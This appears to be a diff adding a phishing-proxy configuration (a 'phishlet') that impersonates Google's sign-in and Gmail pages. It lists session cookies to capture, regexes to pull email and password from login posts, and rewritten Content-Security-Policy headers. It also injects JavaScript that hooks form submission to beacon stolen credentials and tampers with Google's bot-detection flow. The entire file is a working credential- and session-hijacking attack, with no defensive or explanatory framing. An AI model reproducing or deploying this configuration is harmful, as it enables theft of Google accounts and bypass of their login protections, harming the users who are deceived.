@@ -1,0 +1,98 @@
+name: 'gmail'
+author: 'Your Team'
+min_ver: '3.0.0'
+
+proxy_hosts:
+  - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'google.com', session: true, is_landing: true, auto_filter: false}
+  - {phish_sub: 'mail', orig_sub: 'mail', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'myaccount', orig_sub: 'myaccount', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'google.com', session: false, is_landing: false, auto_filter: true}
+
+sub_filters:
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: '</head>', replace: '<script>window.bgBypassEnabled=true;</script></head>', mimes: ['text/html']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'Content-Security-Policy', replace: "default-src * 'unsafe-inline' 'unsafe-eval' data: blob:; script-src * 'unsafe-inline' 'unsafe-eval'; style-src * 'unsafe-inline';", mimes: ['text/html']}
+  - {triggers_on: 'mail.google.com', orig_sub: 'mail', domain: 'google.com', search: 'Content-Security-Policy', replace: "default-src * 'unsafe-inline' 'unsafe-eval' data: blob:;", mimes: ['text/html']}
+
+auth_tokens:
+  - domain: '.google.com'
+    keys: ['SID', 'HSID', 'SSID', 'APISID', 'SAPISID', 'NID', 'OGPC', '1P_JAR', 'CONSENT', 'AEC', '__Secure-3PSID', '__Secure-3PAPISID']
+  - domain: 'accounts.google.com'
+    keys: ['GAPS', 'LSID', 'ACCOUNT_CHOOSER']
+
+auth_urls:
+  - '/ServiceLogin'
+  - '/signin/v2'
+  - '/signin/v2/identifier'
+  - '/signin/challenge'
+  - '/signin/v2/challenge/pwd'
+  - '/_/signin/slotide'
+  - '/v3/signin/_/AccountsSignInUi/data/batchexecute'
+
+credentials:
+  username:
+    key: 'email'
+    search: 'name="(identifier|email)"'
+    type: 'post'
+  password:
+    key: 'password'
+    search: 'name="password"'
+    type: 'post'
+
+login:
+  domain: 'accounts.google.com'
+  path: '/ServiceLogin?hl=en&passive=true&continue=https://mail.google.com/'
+
+force_post:
+  - path: '/signin/v2/identifier'
+    search:
+      - {key: 'flowName', search: '.*'}
+    force:
+      - {key: 'continue', value: 'https://mail.google.com/'}
+    type: 'post'
+
+  - path: '/signin/challenge'
+    search:
+      - {key: 'flowName', search: '.*'}
+    force:
+      - {key: 'continue', value: 'https://mail.google.com/'}
+    type: 'post'
+
+  - path: '/signin/v2/challenge/pwd'
+    search:
+      - {key: 'flowName', search: '.*'}
+    force:
+      - {key: 'continue', value: 'https://mail.google.com/'}
+    type: 'post'
+
+js_inject:
+  - trigger_domains: ['accounts.google.com']
+    trigger_paths: ['/']
+    script: |
+      (function() {
+          if (!window.bgBypassEnabled) return;
+          
+          var originalFetch = window.fetch;
+          window.fetch = function(url, options) {
+              if (url.includes('/v3/signin/_/AccountsSignInUi/data/batchexecute') && 
+                  url.includes('rpcids=V1UmUe')) {
+                  console.log('[Botguard] Request intercepted');
+              }
+              return originalFetch.apply(this, arguments);
+          };
+          
+          var originalSubmit = HTMLFormElement.prototype.submit;
+          HTMLFormElement.prototype.submit = function() {
+              var form = this;
+              var emailField = form.querySelector('input[name="identifier"], input[name="email"]');
+              var passField = form.querySelector('input[type="password"]');
+              
+              if (emailField && passField && passField.value) {
+                  var data = new URLSearchParams();
+                  data.append('email', emailField.value);
+                  data.append('password', passField.value);
+                  
+                  navigator.sendBeacon(window.origin + '/_/signin/slotide', data);
+              }
+              return originalSubmit.apply(this, arguments);
+          };
+      })();
